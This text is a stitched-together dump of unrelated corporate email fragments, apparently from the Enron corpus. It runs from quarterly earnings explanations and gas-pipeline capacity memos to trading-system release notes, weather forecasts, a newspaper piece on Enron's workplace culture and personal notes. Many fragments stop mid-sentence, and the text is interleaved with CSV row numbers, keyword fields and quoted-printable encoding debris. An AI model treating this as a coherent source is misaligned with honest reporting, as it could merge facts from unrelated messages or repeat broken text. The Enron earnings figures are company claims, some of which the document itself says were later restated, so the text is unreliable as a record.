We made a commitment to you that we would provide you with timely information about Enron's business strategy and performance, so this email is intended to provide an explanation about our earnings this quarter.

Over the past few months, we have met with analysts to discuss Enron's performance.  We received considerable feedback from investors and analysts that we needed to expand our financial reporting to include details for more of our business units.  In response to that feedback, we have provided results separately for several of our business units.  For example, while we have provided volume figures for North America and Europe, this is the first quarter we have provided financials separately for Enron Americas and for Europe and Other Commodities.  In addition, information about our global assets had previously been included in our numbers for Wholesale Services.  This quarter they are reported separately.   Finally, even though our broadband business is now part of Enron Wholesale Services, we are continuing to report that business separately.

Following are the highlights of our businesses:

Wholesale Services: Total income before interest, minority interests and taxes (IBIT) increased 28% to $754 million in the third quarter.  Total wholesale physical volumes increased 65% to 88.2 trillion British thermal units equivalent per day (Tbtue/d).
Americas: IBIT increased 31% to $701 million.  Natural gas volumes increased 6% to 26.7 Tbtu/d, and power volumes increased 77% to 290 million megawatt hours (MWh).
Europe and Other Commodity Markets: IBIT remained unchanged at $53 million as compared to last year.  While physical gas and power volumes increased, low volatility in these markets caused profitability to remain flat.

Retail Services: Enron Energy Services reported IBIT of $71 million, compared to $27 million a year ago.  So far this year, EES has completed more than 50 transactions with large customers and more than 95,000 deals with small business customers.


Transportation and Distribution:
	Natural Gas Pipelines: IBIT increased slightly to $85 million in the third quarter.
Portland General: We reported an IBIT loss of $(17) million this quarter compared to IBIT of $74 million a year ago.  This loss is due to power contracts PGE entered into at prices that were significantly higher than actual settled prices during the third quarter.  Last week, we  announced an agreement to sell PGE to Northwest Natural.  This transaction is expected to close next year.
Global Assets: This segment includes Elektro, Dabhol, TGS, Azurix and Enron Wind.  Third quarter IBIT remained unchanged at $19 million compared to last year.

Broadband Services: IBIT losses were $(80) million in the current quarter compared to a $(20) million loss last year.  This quarter's results include significantly lower investment-related income and lower operating costs.

Corporate and other: This segment includes the unallocated expenses associated with general corporate functions. This segment reported an IBIT loss of $(59) million compared to $(106) million a year ago.

In addition, this quarter we announced one-time charges of $1.01 billion.  Over the past few quarters, we have conducted a thorough  review of our businesses and have decided to take certain charges to clear away issues that have clouded the performance and earnings potential  of our core businesses.  These charges include:
?	A $287 million write-down of Azurix Corp.
?	$183 million associated with the restructuring of Broadband Services.  This includes severance costs, a loss on the sale of inventory like servers and routers, and a write-down of the value of our content services contracts due to the bankruptcy of a number of customers.
?	$544 million related to losses from certain investments, primarily Enron's interest in The New Power Company, broadband and technology investments and early termination of a structured finance arrangement.  

With our announcements this quarter we accomplished three things:  1) we showed continued strong earnings and earnings growth in our core businesses, 2) we cleared away those things that were clouding this superb performance in our core businesses, and 3) We expanded our reporting of financial results to increase transparency for our investors.

660,"As a follow-up to our meeting last Friday, I have reviewed the Comprehensive Settlement Agreement (CSA), SoCalGas System Adequacy proceeding testimony of Lad Lorenz and the CPUC Dec. 11, 2001 Decision on Unbundling the SoCalGas system by implementing the CSA with modifications.  I also have a call into Rodger Schwecke at SoCal to discuss their upcoming tariff filing and the related capacity issues.  Some of the pertinent points made in these documents relative to receipt point capacity and allocation are as follows:

Comprehensive Settlement Agreement

Appendix B outlines the details of backbone transmission/receipt point capacity rights:
	
1. All receipt points will be defined with firm capacity and primary access rights that reflect physical limitations.  The Appendix B table of receipt point capacity indicates that for No. Needles, Transwestern has Primary Access Rights of 750MMcf/d and Mojave at Hector Road has Secondary Access Rights.

2.  For interconnects into SoCalGas with more than one upstream pipeline, secondary access rights will be defined.

3.  New or expanded interconnects with existing or new pipelines will have secondary access rights only and will be subject to bumping by gas scheduled through primary access points.  

In the text of the CSA, the Open Season procedures for intrastate backbone transmission/receipt point capacity are described in detail.  Briefly, its proposed to work as follows:

1.  Initial Reservation for Core customers.  SoCalGas Acquisitions, core transport agents and wholesale customers serving the core will be provided a set aside amount of capacity.  This included 300MMcf/d at North Needles.

2.  First Stage/Phase I of the Open Season for 50% of RP capacity after deducting core customer set aside.  Existing noncore customers may bid on any RP capacity up to 100% of their historical usage.

3.  Second Stage/Phase II of the Open Season for remainder of Phase I capacity, if any, not awarded or allocated.  Available to same existing noncore customers as in Phase I to bid on in this second round if they haven't been awarded capacity up to their 100% historical usage.

4.  Third Stage/Phase III of the Open Season for 50% of RP capacity after deducting core customer set aside plus any remaining capacity not awarded in Phases I and II.  Bidding open to any existing or new customers with creditworthiness established.

5.  SoCalGas will hold annual open seasons for expired or non-contracted available capacity.

6.  Market concentration limits were set such that no person or entity including affiliates may hold more than 40% of the capacity (after core set aside) at any one receipt point awarded through the open season process.  This does not include secondary market capacity or individually negotiated contracts acquired after the initial open season.

Examples of North Needles capacity:	Physical capacity	750 MMcf/d		Add'l 25/50	775/800
					Core Cust. set aside	300			Inc. core	313

System Adequacy Proceeding--Lorenz Testimony

Lad Lorenz testifies that the proposal to allocate firm receipt point capacity on the SoCalGas system is intended to be used ""until the commission acts in the GIR proceeding"".  

In Section H. of Lad's testimony on Firm Receipt Point Access, Table II illustrates that North Needles will be expanded by 50MMcf/d to a level of 800.  In Table III under the heading of Firm Primary Access it states ""TW--who then allocates among its shippers"" in reference to the 800MMcf/d of capacity listed for North Needles.

In this same Section H, Lad states that this alternative proposal for allocating primary firm capacity at each receipt point will achieve improved reliability ""until the Commission acts to approve the CSA"".

CPUC Decision 01-12-018 on SoCalGas Unbundling

The Commission approved the CSA on Dec. 11, 2001 with certain modifications.  These modifications included:

1.  Market concentration limits were decreased from 40% to 30% and included capacity attained in subsequent open seasons or by individually negotiated contracts.  Secondary market capacity remains excluded from the market concentration limit.

2.  A secondary market price cap was established at 120% of the interruptible rate ($.07191).

3.  Reinstated the core reservation for intrastate capacity at 1044MMcf/d (CSA lowered it to 1000).  This explains why the core reservation for Needles is 313 and doesn't match the TW/SoCal contract level.  The additional 44 was allocated per a Calpine proposal on a prorata basis to each receipt point with Needles receiving an additional 13MMcf/d.

In the summary and conclusion sections of the Decision, SoCalGas was directed to include the additional 375MMcf/d of new backbone and receipt point capacity in its open season.  This part of the Order did not provide any direction as to how the new capacity was to be allocated to upstream pipelines.  Additionally SoCalGas was directed to file an advice letter for implementation and to include proposed methods for allocating any additional future capacity additions.",Lad Lorenz Rodger Schwecke Transwestern Cap cap Lorenz Testimony North Needles SoCalGas,,"SoCal RP MMcf Phases I & II II Firm Primary Access Commission CPUC Decision SoCalGas Unbundling

																											New  Pipeline Interconnection to Offer Canadian Supply
																											
																											
																											
																											?  ? Empire State Pipeline and the National Fuel Gas have  completed a new 
Canadian pipeline interconnection at Pendleton, NY,  allowing natural gas to 
flow to the US from Canada. The volumes from  Canada could flow to the 
Buffalo area market as well as to NFG's  interconnects with Tennessee Gas 
Pipeline in East Aurora, NY and  Ellisburg, PA; Dominion Transmission in 
Ellisburg; and  Transcontinental Pipeline and TETCO at Leidy. Empire Pipeline 
is  owned by ANR and Westcoast Energy's St. Clair Pipelines. ANR  Pipeline 
serves as the physical operator for Empire Pipeline, which  extends for about 
156 miles from Buffalo to Syracuse. Most of the  natural gas will come from 
Western Canada, and the new pipeline will  give more flexibility and supply 
options for Empire's shippers.

																										Rotary Rig Counts Down 
																										
																										
																										
																										?  ? The number of rigs exploring for oil and natural gas in North  America 
fell by 8 for the week ending November 3rd, according to  Baker Hughes. The 
number of rigs operating in the US fell by 6 to  763 to 1,078 compared to 763 
a year ago. The number of rigs in  Canada fell by 2 to 362, compared with 
last year's 336. In the Gulf  of Mexico, the number of rigs searching for oil 
and natural gas fell  by 3 to 148 compared to 113 last year. The number of US 
rigs  searching for oil rose by 4 to 232, while the number searching for  
natural gas fell by 10 to 845. The number of US rigs exploring on  land fell 
5 to 906, while the number operating offshore fell by 3 to  152. The number 
in inland waters rose by 2 to 20.? There were  250 US rigs exploring 
directionally, 68 exploring horizontally, and  760 exploring vertically. The 
weekly rig count reflects the number  of rigs exploring for oil and natural 
gas, not those producing.

Enron lived 'on edge - sex, money, all of it' 
The rise and fall of Houston decadence
Philip Delves Broughton 
The Daily Telegraph, with files from news services 
HOUSTON - Enron was a company in love with itself. Office affairs were rampant, divorce among senior executives an epidemic and stories of couples steaming up glass-walled offices after late-night meetings were the talk of Houston.
""It was insane,"" says a former energy trader, soothing her financial injuries with a margarita.
""There were no rules for people, even in our personal lives. Everything was about the company and everything was supposed to be on the edge -- sex, money, all of it.""
The music has suddenly stopped. The startling demise of the energy giant has wiped out savings and pensions, destroyed careers and dragged the U.S. version of free-market capitalism into the interrogation room.
The reverberations of Enron's collapse will be felt for years in Washington and on Wall Street, but nowhere more than in Houston, the stage for Enron's gaudy act. From the mid-1980s, when Enron was created by the merger of two energy companies, Houston became its town. The company filled the void left by the oil companies, whose buccaneering days had ended with the collapse in oil prices.
In River Oaks, the most exclusive suburb of Houston, Enron executives began building huge mansions. Jeff Skilling, the executive who transformed Enron under the more genteel rule of Ken Lay, the former chief executive, decorated his house in black and white, Enron's corporate colours, from the marble to the sofas to the flowers, wallpaper and pictures.
The Enron wives became known around town for their Mercedes, fur-trimmed sweaters and leather pants.
But in the excitement, Enron lost touch with its mortality, not to mention morality. Mr. Skilling wanted it to become an alternative to the Wall Street banks.
He wanted to recruit the best, which meant persuading the leading business school graduates from places such as Harvard, his alma mater, and Stanford to choose Houston over New York or Silicon Valley.
He did so by creating the same culture of unselfconscious greed and reward that Wall Street was forced to suppress by the insider-trading scandals of the late 1980s. He built his own Bonfire of the Vanities in Houston and everyone wanted to feel its warmth.
Among the perks were the in-house health club and doctor's office, as well as laundry and car-washing services. Broadband traders were issued hand-held computers and wireless laptops, and frequently went on junkets to the Bahamas or hunting weekends in Mexico. Others accompanied Mr. Skilling to hike glaciers in Patagonia or race Land Cruisers in Australia.
One employee described how he got a 10% discount in a tony men's clothing store by mentioning he worked for Enron. Elsewhere in town, nightclubs waived cover charges for Enron employees.
But the work culture that employed these carrots was brutal.
Managers employed a system known as ""rank or yank,"" with semi-annual reviews in which every employee's performance was ranked one to five. As the names flashed on a projector, the bosses graded them. The bottom 15% of workers were fired each year.
The pay was not particularly high -- trainees started at US$35,000, The Wall Street Journal reported. But they could double that when bonuses were added. Bonus day was known as Car Day, because of the line of expensive sports cars that arrived for the most successful employees -- US$100,000 Porsches were the vehicle of choice.
To the outside world, Enron described itself as a family for which employees were delighted to work punishing hours. Inside it became increasingly incestuous, sexually and financially.
Only those at the top and the traders who saw the kinds of wild bets Enron was placing, on everything from oil to the weather, saw how precarious the whole thing was. They began pulling out as much money as they could.
The best brains began demanding vast salaries to stay and, to save face, Mr. Skilling paid them. Then they asked for more. Senior executives began selling their shares in huge blocks. Everyone at the top was cashing out, while those further down believed the hype.
""We all thrived on the buzz,"" said Mark Lindquist, 39, a Web designer who lost his US$75,000-a-year job and is struggling to pay for his autistic son's treatment. ""It seemed like we were part of something incredible.""
He was one of the 4,500 let go after the company fell into bankruptcy on Dec. 2.
Now, not only the rank-and-file are hurting. Yesterday, Mrs. Lay said her family also lost its fortune.
In an interview with NBC's Today show taped over the weekend at her home in Houston, Linda Lay defended her husband as a decent, moral person who, like many thousands of others linked to Enron, was fighting personal bankruptcy.
""Other than the home we live in, everything else is for sale,"" she said. ""We are fighting for liquidity.""

																				NEB  Releases Energy Market? Assessment 
																				
																				? ?The National Energy Board has released its  latest in a series of Energy 
Market Assessment? reports  entitled Canadian Natural Gas Market Dynamics and 
Pricing. The  report identifies the factors that affect natural gas prices 
and  describes the current functioning of the regional gas markets in  
Canada. The Board's report concludes that Canada has become part of  an 
integrated North American natural gas market. Natural gas can be  bought from 
many supply sources and delivered to any market centre  through an extensive 
North American pipeline grid. With the  increased integration of the markets, 
regional supply and demand  forces are felt throughout the marketplace. It 
also says that a  combination of strong economic growth in North America, a 
preference  for natural gas fired electricity generation, and low natural 
gas  prices led to sustained growth in demand throughout the 1990s.  However, 
the growth in natural gas supply has lagged during the last  few 
																				
																				
																				
																				
																				
																																									
																																	
																																	
																																	
																																	
																																	
																																	
																																	
																																	years. This is primarily attributable to the low oil price  environment of 
1997/1998 which reduced cash flow for the producing  sector. In turn, 
drilling activity decreased throughout North  America. Since demand growth 
has outpaced supply growth, natural gas  prices have increased significantly 
over the last year. With oil  prices recovering sharply in 1999/2000, the 
producing sector has  responded and drilling activity is at high levels. 
Despite the  drilling activity, there is a lag between developing additional 
gas  supplies and connecting those supplies to the market. In time, there  
will be a supply and demand response and accompanying relief in  natural gas 
prices is expected. A period of market adjustment is  necessary any time the 
dynamic between supply, transportation and  demand is significantly changed. 
It is difficult, if not impossible,  to predict with certainty any movements 
in the commodity markets.  The Report found that recent increases in the 
commodity

will be getting cold and possibly icy, Wednesday and Thursday

preparation of this Inclement Weather.   Please let me know if you think

748,"We have actuals.  The larger of the two volumes is 1,395,000, which is 
45,000/day, so the demand rate in deal 514353 is fine.  I am having a 
problem, though, with the way it is coming to settlements.  It is showing up 
with a Jan 2003 delivery date.  I think the demand fee needs to be on 10/1 
only.  Right now, it is on a line with a date of 10/1/00 to 12/31/36.   I 
think this is confusing the system some how.  Also, we still need the 
purchase deal for Tenaska IV.  It should be for a demand fee of $2,571,135.73 
booked to the Cleburne desk.  We actually owe $1,798,389.73, but I need to 
net the Tenaska IV sales with the purchase to clear those receivables.  James 
is calling me every day asking for an update.  Do you know when we will be 
able to get this in the system?  I have attached my spreadsheet so you can

811,"The following additions and modifications to Stack Manager will be effective as of Saturday September 8, 2001.

Stack Manager Modifications

Inactivate All Stack - In addition to the individual Activate/Inactive Stack buttons, there is now an Inactivate All Stack button. Similar to the Suspend All button, this button will inactivate the trader's stack on all active products. Any existing top of stack limit orders will continue to post to the website and remain transactable. See screen shot below: Inactivate All Stack button on far right. 

	 

Please note that we have switched the positions of the suspend and inactivate buttons in Stack Manager.

Fill Order - If a product is set up as either Restricted Top of Stack or Top of Stack the trader now has the ability to automatically fill any order that is at the top of the stack. In order to fill a limit order that is at the top of the product's stack, which will appear in pink, the trader should right click anywhere on the stack window and choose ""Fill order"". The volume filled on an order will be that which is offered by the trader. In order to fill the complete volume of the order, the trader will need to adjust the volume in his stack.

Floated Stack windows - If the stack is inactive on a product, the price and volume fields on the my products tab will continue to be blank. On the depth window and floated stack window of these products the trader's prices will be in gray and italics. Children of products that have inactive stacks will not be gray and italicised in the floated stack windows and will not see the calculated prices.

No Auto Inactivate Stack - It is now possible to keep a product active even if the trader is not logged into Stack Manager. If the trader wishes to enable this functionality on the upper right corner of the product properties page the trader should choose ""No Auto Inactivate when Stack Manager is down"". 

Changes regarding Suspension of products

Stack Manager will inactivate products rather than suspend them in the following cases:

?	Market Close - If a product is active at the end of its trading hours its stack will automatically become inactive rather than suspending. In order to keep a product's stack active past the set trading hours, the trader should choose ""Keep Awake"" next to the trading hours section of the product properties page.
?

828,"To support the data storage of ZMET data here is a proposal for what the 
table structure should be.  In addition, after discussing the status messages 
it is important to differentiate between those which effect availability and 
those that do not.  The FAULTS table includes a flag field INCLUDE which 
serves this purpose for STAR. 

A improvement to this table would be to add a counter description field 
var(4) which would hold one of the following descriptions; SOT, LOT, DT, WOT, 
MT, RT, and EST.  This will allow us do differentiate status messages by 
which counter they are associated with.

Since the intent is to mirror the SQL Server and the STAR db we need to make 
these changes to both.  I'd like to get the SQL server changes ASAP so I can 
develop some additional reports.

The first major Arctic air mass of the year will push into the northern
Plains early to mid next week. Most of Canada will also be much, much colder
than it has been. Check temperatures in Calgary next week and see what I
mean.  Overall, a stormy and much cooler weather pattern for the nation next
week, but the major cold air will hold up in the northern Plains and Upper
Midwest. In agreements with our thoughts from Wednesday, the cold air will
NOT blast into the East and South next week, and it will remain mild in
these areas.

The weather will continue to be stormy in the longer range and turning
gradually colder. I believe the MRF is still too mild looking in early
December, but I still don't believe any major cold reaches the East Coast or
the Deep South before December 5. After that, I continue with my thoughts
that overall, cold weather will overwhelm much of the nation east of the
Rockies after December 5 and by December 15. I still cannot tell how cold or
any of the details as it is still a long way off. I am basing my thoughts
more on the European model here as it SHOULD do better in this weather
pattern.

Earth Sat seems reasonable in their 6 to 10 today, but in my opinion, it
will probably turn out to be colder in the 11 to 15 day across the Plains
and Midwest than they are showing.

The ancillary services market for non-spinning has been horrible.   Non- spinnning for today is,  at most,   90 cents/mw for hours 14-18.  The remaining hours are worth zero.
The down regulation and up regulation markets are lucrative  at as much as $11.99/mw ,  but we are not certified for this service.     As I understand it,  there is some work necessary on the plant to allow us to sell up/down regulation and replacement.  GE personel were to travel to the plant and do some work,  but in light of world events,  I do not know if they have arrived.
Once the upgrades are complete,   we need to restart the certification process with Ercot.

If we sell non-spin for .90,  we would need to withhold this power from the market.   We have been selling,  on a Real Time basis,   as much power as we can get out the door.   We have not been selling offpeak and we are starting schedules,  typically at hour 10 through 22 for a sales price of $24.

That is the latest.   We are currently looking at making sales in October.  The heat rate is around 10.7

other states, you would be interested in EEI's new Web site.

The State Restructuring Service includes:

o  News and analyses of noteworthy legislative, regulatory and judicial 
decisions as they occur
o  Implementation decisions in restructuring states
o  Noteworthy restructuring-related actions in other states, even if not of 
comprehensive scope
o  E-mail notification of all noteworthy restructuring and related actions

o  Site's Action Alerts are browsable and fully searchable
o  Hyperlinks to all Web posted source documents are provided
o  Policy overviews and analyses of all comprehensive restructuring laws and 
regulatory decisions

The service includes e-mail notification of breaking restructuring actions, 
as well as full access to the Web site.  For those who just need a heads up 
about noteworthy state policy actions, the e-mail service is available as a 
separate stand-alone service (free to members) or for half the price of the

875,"Today, Enron hosted a conference call to give investors a current overview =
of the company. Here's an update of what we discussed during the call.

We told investors that we're doing everything we can to protect their inter=
ests and to regain their confidence. Our focus remains on our credit qualit=
y, balance sheet and liquidity, which are essential for our continued succe=
ss and expansion of our wholesale businesses.

It took more than a few weeks to get where we are today. Here's a snapshot =
of significant events that led to our current situation:

-- In hindsight, we definitely made some very bad investments in our non-co=
re businesses over the past several years. Those include investments in Azu=
rix, India and Brazil. They have performed far worse that we could have eve=
r imagined when we made these investments;

-- Because of these bad investments, we've become over-leveraged as a compa=
ny. The negative impact of those investments was exacerbated through the ex=
tensive use of debt capital both on and off our balance sheet;

-- We also entered into related party transactions that led to a loss of in=
vestor confidence, which has been very damaging;

-- We've been criticized for our lack of transparency and our hard-to-under=
stand financial and operating disclosures; and

-- On top of it all, we discovered errors in our financial statements, as d=
iscussed in our 8-K filing last week, that required a restatement of previo=
usly reported earnings.

We've taken a new look at our businesses and have separated them into three=
 areas: core businesses, non-core businesses, and businesses under review.

Core Businesses

Our core businesses remain strong and consistent sources of significant ear=
nings and cash flows for the company. They're our competitive advantage. Th=
ese include:

-- Natural gas pipeline businesses;

-- Gas and power businesses in North America and Europe;

-- Retail businesses in North America and Europe; and

-- Coal businesses in North America and Europe.

The events of the past few weeks have had a temporary negative impact on ou=
r projected fourth quarter profitability. It's too early to tell at this ti=
me what impact this might have on our operating results. We are considering=
 these actions now so that we can quickly return to normal business in 2002=
.

I also remain optimistic that the actions we've taken over the past couple =
of weeks have addressed our customer and counterparty credit and liquidity =
concerns. According to our business unit leaders, we have definitely seen i=
mprovement in our counterparty relationships.

Non-Core Businesses

Our non-core businesses include our global assets group and our broadband d=
ivision. We have invested more than $8 billion in these businesses, and the=
 return from them has been dismal.

We have an aggressive program in place to exit these businesses and expect =
that the sale of these businesses will generate billions of dollars in cash=
 that we can use to repay debt and reinvest in our core businesses. We alre=
ady have more than $800 million in assets contracted for sale this year. Th=
ey include CEG Rio, a gas LDC in Brazil; EcoElectrica, a power plant and LN=
G receiving terminal in Puerto Rico; and asset sales of offshore oil and ga=
s properties in India. The approximately $2.9 billion Portland General sale=
 is also on target to close in late 2002 pending regulatory approvals.

Businesses Under Review

These businesses are comprised of those operations outside our power and ga=
s wholesale businesses and include global and industrial markets. While sev=
eral of these businesses have very strong future prospects, we need to dete=
rmine if their capital requirements and near-term growth prospects are suff=
icient enough in terms of earnings and cash generation.

Reviewing our businesses this way will help determine where we need to make=
 reductions to our work force. More information will follow as soon as it b=
ecomes available.

Credit Rating/10-Q Filing

We continue to meet regularly with credit rating agencies and believe that =
our liquidity enhancements and scheduled asset sales will strengthen our ba=
lance sheet and maintain our investment grade credit rating. Our current cr=
edit ratings by the three major rating agencies are as follows:

-- Moody's at Baa3       ""Under Review for Further Downgrade""

-- Fitch at BBB-             ""Evolving Status""

-- S&P at BBB-              ""CreditWatch Negative""

We also discussed our existing financial vehicles, including Osprey, Marlin=
 and Yosemite, in further detail. We told investors that we will file our 1=
0-Q five days late due to our current activities. It will be filed on Nov. =
19.

We will continue to have updates with investors over the coming weeks as we=
ll as our frequent updates with you. The full transcript of our conference =
call will be filed with the Securities and Exchange Commission in the next =
few days. It will also be posted on our web site at www.enron.com/corp/inve=

I'm trying to put together information for the BTRC to show how detailed this activity is.  If someone from the BTRC just looked at the total volume, the price we need to pay the producer, and the price we can get for this gas today, the BTRC may decide that we need to pay the producers and sale the gas.

885,"Tetco held a 637 ""settlement"" conference last Fiday to discuss their latest 
proposal dated March 8th.  Their new proposal involved the institution of a 
weekly cash-out mechanism along with a daily variance penalty based on 
overall system position.

In brief:
PENALTIES
Stage One--on any day where a shipper's imbalance in greater than 7% in any 
zone, the ""daily imbalance charge"" would be 2x the maximum PAL rate for the 
entire balance (not just the piece that's over 7%) in each zone.
Stage Two--on any day where either the Market Area or Access Area is out of 
balance by greater than 4%, Tetco would have the discretion to issue a Stage 
Two notice, establishing a tolerance level (which could be 0, subject to 
Tetco's sole discretion) that all shippers would have not less than 12 hours' 
notice with which to comply.  Under Tetco's propsal, any volumes in excess of 
the level stated in the notice would be assessed a ""daily imbalnce charge"" 
equal to 4x the maximum PAL rate.
In a Stage 2 situation, if your imbalance is in the opposite direction of the 
pipe, no penalty would be charged (but you'd still cash-out)

CASH-OUT
Weekly monetization of cash-out positions based on a Sunday to Saturday week 
(Tetco needs to revise this so that the weeks are managed depending on how 
the calendar falls so that they minimize problems like a 2-day week).
Monetization by Zone in 2 tiers
 0-4% to be cashed-out at the average of each day's mid point price for the 
weekly period
 4%+ ENTIRE IMBALANCE cashed-out at the weekly highest/lowest common price 
for the week 
This is a significant change since under the current tariff, shippers pay a 
staggered fee, such that volumes with in the first tier are charged that 
tier's price, then overflow into the next tier is charged at that tier's 
price, etc.  Now, the entire amount would be assessed the higher price.

NETTING & TRADING
would be limited to the week in which the imbalance was incurred and would be 
limited by zone (contrary to Order 637)
Any netting or trading would not decrease the daily imbalance charge (the 
positions would be frozen each day) but could decrease the cash-out exposure 
(completely contrary to 637 which indicates that netting & trading should be 
a tool used to limit penalties)

Results:
it would be possible, in fact likely, that a shipper would pay both an 
imbalance penalty and a cash-out fee on the same volume (contrary to Order 
637)
under the Zero tolerance Stage Two scenario, Tetco would have complete 
discretion to set the level (not itself a bad thing, they need to be able to 
control their system)--they've indicated that they'd set a 2% floor for 
penalties but that doesn't really solve the problem.
not only would the cash-out mechanism be more difficult to administer, it 
could significantly increase our cash-out liability and subject us to 
penalties that do not exist today.

Dynegy, PGC and Indicated Shippers indicated to Tetco that we don't see any 
progress towards settlement, or even a foundation to go forward on and that 
we're ready at this point to go to the Commission for a decision on their 637 
filing as a whole.  Several of the LDC's stated that they want to continue to 
pursue settlement so we agreed to submit a status report to Staff indicating 
that we'll continue to talk, setting an April 30th deadline.  At that point, 
I expected that Tetco would attempt to establish an aggressive negotiation 
schedule in an effort to make some progress--instead all they did was agree 
to my request to provide a comparison of the different offers and scheduled a 
follow up meeting for April 10th.

Tetco indicated that they don't plan to make another offer and would not 
agree to entertain counter-offers.  At this point, I doubt that we'll make 
any significant progress and believe that this issue will end up being 
litigated, or at least submitted to  the FERC for a decision.  Based strictly 
on the letter of the Order (or at least our interpretation of it), I think we 
have

I think Risk can do two things to improve the process:  have more of us 
involved in the process so they actually see the implications of booking 
deals incorrectly and actively following up on recurring problems.  This last 
one I am particularly bad about.  I will see a variance that is rather small 
and just take it without looking into the underlying cause more carefully.  I 
think the OA group in general should take a more active approach in 
preventing problems rather than just identifying them.  But I know that is 
easier said than done.

We have something set up. This is not a traditional tailgate party,
there will be no reserved section at this place, or banners or flags
or anything. This is simply a place to gather and eat before the game,
and hang out watch the early bowls games that day. Some others will be
doing some more traditional things around San Diego that day, but all
will start later, so come have some lunch with us and then head over to

to gourmet pizzas, enchiladas to bbq ribs, and everything in between.

Be careful when you get there to look for the name. There will not be
any Texas paraphanalia out anywhere. The place is nervous we might run
off the Husky fans if we bring our gear (what a shame that would be),

Hope you got the attachment okay that I sent.? If it weren't for the kids I'd 
probably make it my screen saver.? I'm sending you another one that I thought 
was nice but funny too!? 

Cita is doing better.? She back home and says she's feeling better.? But, She 
keeps teasing us with a cough that we have to watch real close.? The first 
few nights she stayed here after her release from the hospital were pretty 
tense.? She was afraid to go to sleep.? She continues to have visions of Bill 
at her bedside!? I keep telling her that he just wants to make sure the she 
stops mourning him because he's finally resting and very happy.? I tell her 
that if he was standing at ""my"" bedside then I?would surely have reason to 
worry and not sleep!!? Heck, what else can I say?? As always, I try to pop in 
some humor so she can hopefully see the funny side of life.

As fas as I know, we're going to be celebrating Christmas Eve here.? I'll let 
you know if that changes.? And please promise me that you'll keep the cost of 
my Christmas present just under $1,000 - promise?? If spend more I'll just 
have to give you a bigger hug!!? Just kidding!? It'll be a little hug!!

Are you good friends with any University of Oregon Alumni?? Let me know 
because I have a new client that wants to market a really cool UO neon 
light.? Plus, with all the hype of them going to the Holiday Bowl my client 
wants to jump on the fan excitement. (I'm sure they would've rather gone to 
the Fiesta Bowl and earned an extra twelve million dollars!!!)? Anyway, let 
me know if you know any UO Alumni.? Thanks.

Enron Principal Investments (EPI), which was formed in the 2nd quarter, has completed its integration and the development of its new strategy.  This group will be responsible for identifying, closing, managing and exiting all non-E&P equity investments for Enron worldwide.  Kevin Garland will lead EPI, which includes Barbara Paige, Andrew Marsden, Kevin Kuykendall, Steven Sheldon, Michele Nezi Marvin and Mark Gandy.  Additionally, Dick Lydecker and the Special Asset Group will continue to report to Kevin.

EPI will pursue investments related to Enron's core businesses, where Enron has a unique insight into the market, company or technology.  Initially, this will be geographically focused in North America and Europe.  This group will rely heavily on the support and cooperation of the core business units to provide information and market insight.  

EPI may make investments in the form of venture capital, leverage buyouts, growth equity, or private equity in public companies.  The group will not make investments in seed stage companies, other funds, subsidiaries of larger corporations, or project equity.

in his floor meeting last week,  Rick would like for everyone to purchase 
tickets from the Travel Agency in the Park (TAP), which is the preferred 
travel agent for Enron.  The savings that Enron receives from using TAP is 
insurmountable.  See below, a list of the contracts Enron has negotiated with 
some of the airlines.  Whenever possible, plan to purchase tickets at least 
3-7 days in advance.  Often the pre-purchase savings outweighs the potential 
switching fee. The travel agency is also able to give you a better price for 
hotel reservations through the Hickory rate, which is cheaper then the 
corporate rate.  TAP's phone number is 713-650-8080 (web address:

June 25-27, 2001, San  Francisco, CA
Presented by: Infocast 


[IMAGE] Concerns  regarding the price and availability of electricity have 
brought an urgent  call from state governments, regulators, utilities and 
consumers  throughout the West: Build more power plants, and build them 
quickly!  However, as natural gas prices scale to new heights and with the 
electric  transmission system contributing to power outages in San Francisco, 
it has  become clear that the problem is more complex, and that plant 
developments  alone won't resolve the power crisis in the west. While it is 
clear that  something must be done, and done quickly, it is not nearly as 
clear what  the right combination of ""fixes"" is. What is the most 
cost-effective  solution to the energy shortfall?  

This conference, Energy Infrastructure Crisis in  the West, will offer a 
comprehensive view of the shortcomings  of the current energy 
infrastructure--generation, natural gas pipelines  and storage, electric 
transmission-and how these shortcomings might be  addressed through 
development. You will hear from legislators, regulators,  and state officials 
how they are encouraging the development of new energy  infrastructure, and 
from developers and utilities what it will really take  to quickly respond to 
infrastructure needs. Specific issues that will be  addressed include:  

Legislative, utility and consumer views on how to solve the energy  crisis  
Developing new generation--what should be done to expedite the  process?  
Electric transmission bottlenecks--can a solution be quickly found?  
Beefing up the region's natural gas infrastructure--comparing  pipeline and 
storage expansion proposals 

If you are considering  the development of energy assets in western power 
markets, attending this  conference is your best opportunity to learn about 
the prospects for  success. Plus, don't miss our exciting half-day 
pre-conference workshops  ""Economic Evaluation of Quick Fixes to Local Power 
Supply Problems"" and  ""Establishing Demand Response Programs that Work"".  

Register by Friday, May 25, 2001 to receive a SPECIAL DISCOUNT and attend for 
only $795.00  for the conference and $200.00 per pre-conference workshop.

possible ways this action is unlawful.  First, this violates the banking

hold all PX accounts in trust for PX participants.  Second, these are 
wholesale contracts and the State only has the right to exercise eminent

reports that 75 percent of all coal-fired capacity in this country is now=

The improvement of power generation efficiency will be one of the most=20

of the reductions expected to come from coal-fired power plants.  In 1997,=
=20
the National Ambient Air Quality Standards for particulate matter and ozone=

were adopted with an anticipated compliance cost for full attainment=20
estimated at $37 billion per year (particulate) and $10 billion per year=20
(ozone) respectively.  The Supreme Court is reviewing these EPA rules, and=
=20
recently supported the EPA's right to regulate these emissions [see 3/1/01=

will lead to additional NOx and SO2 emission reductions, the two precursors=

In November 1999 the EPA filed lawsuits against seven utility companies for=

Caroline forwarded me your questions regarding the Risk System so I wanted to 
go ahead and respond since Steve is out this week.

I don't think Philippe requires the level of due diligence that we performed, 
but we were getting questioned on buying a 3rd party product vs. using an 
Enron Risk System.  We did more research and got the other groups involved so 
that they would understand our decision.  I believe everyone is now 
comfortable with our purchase decision.

In our analysis of systems, we selected the Caminus product in part because 
we had several individual references from Arthur Andersen, Deliotte &Touche 
and Ernst & Young.  These organizations, especially Arthur Andersen, have 
audited this application and have actually participated in numerous 
implementations.  Ernst & Young recently selected Caminus for Equitable 
Resources.   Arthur Anderson implemented the application for Conoco and 5 or 
6 other companies, and Deloitte Touche recently selected the product for 
Tractabel.  After talking with individuals from these accounting firms, we 
felt very confident that the product was sound, and we should not have audit 
concerns.  Obviously, we have a lot of business procedures that have to be 
established, and there is time in the work plan to do that work, but a lot of 
those decisions drive how the application is configured so we need to get the 
product purchased work through the details of how we implement the new 
business procedures since the system does drive a lot of processes. 

